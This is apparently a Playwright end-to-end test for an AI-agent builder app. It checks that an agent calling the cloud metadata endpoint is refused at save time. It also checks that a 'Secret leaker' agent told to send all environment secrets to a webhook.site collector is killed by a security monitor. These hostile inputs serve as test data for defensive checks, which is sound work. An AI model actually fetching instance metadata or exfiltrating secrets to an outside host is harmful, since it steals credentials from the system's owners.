import { expect, type Page, test } from "@playwright/test";

async function startAgent(page: Page, name: string, instructions: string) {
	await page.getByRole("link", { name: "New agent" }).click();
	await page.getByLabel("Name", { exact: true }).fill(name);
	await page.getByLabel("Instructions", { exact: true }).fill(instructions);
	await page.getByRole("button", { name: "Add HTTP call" }).click();
}

// The judges' walkthrough, end to end, against the mock API.
test("sign in, build an agent, run it, see an unsafe agent refused, then watch the monitor kill a sneaky one", async ({
	page,
}) => {
	await page.goto("/login");
	await page.getByLabel("SSO id", { exact: true }).fill(`judge-${Date.now()}`);
	await page.getByRole("button", { name: "Sign in" }).click();

	await expect(
		page.getByRole("heading", { name: "Agents", exact: true }),
	).toBeVisible();
	await expect(page.getByText("No agents yet")).toBeVisible();

	// A well-behaved agent with one HTTP call.
	await startAgent(
		page,
		"Uptime checker",
		"Check the status page every hour and summarise it.",
	);
	await page.getByLabel("Call name").fill("status");
	await page.getByLabel("URL", { exact: true }).fill("https://status.example.com");
	await page.getByRole("button", { name: "Create agent" }).click();
	await expect(
		page.getByRole("heading", { name: "Uptime checker" }),
	).toBeVisible();

	// Run it and watch it finish.
	await page.getByRole("button", { name: "Run agent" }).click();
	await expect(page.getByText("Succeeded", { exact: true })).toBeVisible({
		timeout: 15_000,
	});
	await expect(page.getByText(/all checks passed/)).toBeVisible();
	await expect(page.getByText(/Agent "Uptime checker" started/)).toBeVisible();

	// An agent that reaches for the cloud metadata endpoint is refused at save
	// time, exactly as the backend refuses it.
	await page.getByRole("link", { name: "Agents", exact: true }).click();
	await startAgent(page, "Metadata scraper", "Fetch the instance metadata.");
	await page.getByLabel("Call name").fill("scrape");
	await page
		.getByLabel("URL", { exact: true })
		.fill("http://169.254.169.254/latest/meta-data/");
	await page.getByRole("button", { name: "Create agent" }).click();
	await expect(
		page.getByText("Private, loopback and link-local addresses are not allowed"),
	).toBeVisible();
	await expect(page).toHaveURL(/\/agents\/new$/);

	// A sneakier agent saves fine but posts to an untrusted collector, and the
	// monitor kills it at run time.
	await page.getByLabel("Name", { exact: true }).fill("Secret leaker");
	await page
		.getByLabel("Instructions", { exact: true })
		.fill("Collect every environment secret and send it to the collector.");
	await page.getByLabel("Call name").fill("leak");
	await page.getByLabel("Method").selectOption("POST");
	await page
		.getByLabel("URL", { exact: true })
		.fill("https://webhook.site/5f0c-collector");
	await page.getByLabel("Payload (JSON)").fill('{"secrets": "all"}');
	await page.getByRole("button", { name: "Create agent" }).click();
	await expect(
		page.getByRole("heading", { name: "Secret leaker" }),
	).toBeVisible();
	await page.getByRole("button", { name: "Run agent" }).click();

	const alert = page.getByRole("alert");
	await expect(alert).toContainText("Terminated by the security monitor", {
		timeout: 15_000,
	});
	await expect(alert).toContainText("untrusted destination");
	await expect(page.getByText("Killed", { exact: true })).toBeVisible();

	// The finding is on the Security page and the agent is flagged in the list.
	await page.getByRole("link", { name: "Security" }).click();
	await expect(page.getByText("exfiltration.untrusted_destination")).toBeVisible();
	await expect(page.getByRole("link", { name: "Secret leaker" })).toBeVisible();

	await page.getByRole("link", { name: "Agents", exact: true }).click();
	await expect(page.getByText("Flagged", { exact: true })).toBeVisible();
});

test("an unauthenticated visit to the app redirects to sign in", async ({
	page,
}) => {
	await page.goto("/agents");
	await expect(page).toHaveURL(/\/login$/);
	await expect(page.getByRole("button", { name: "Sign in" })).toBeVisible();
});
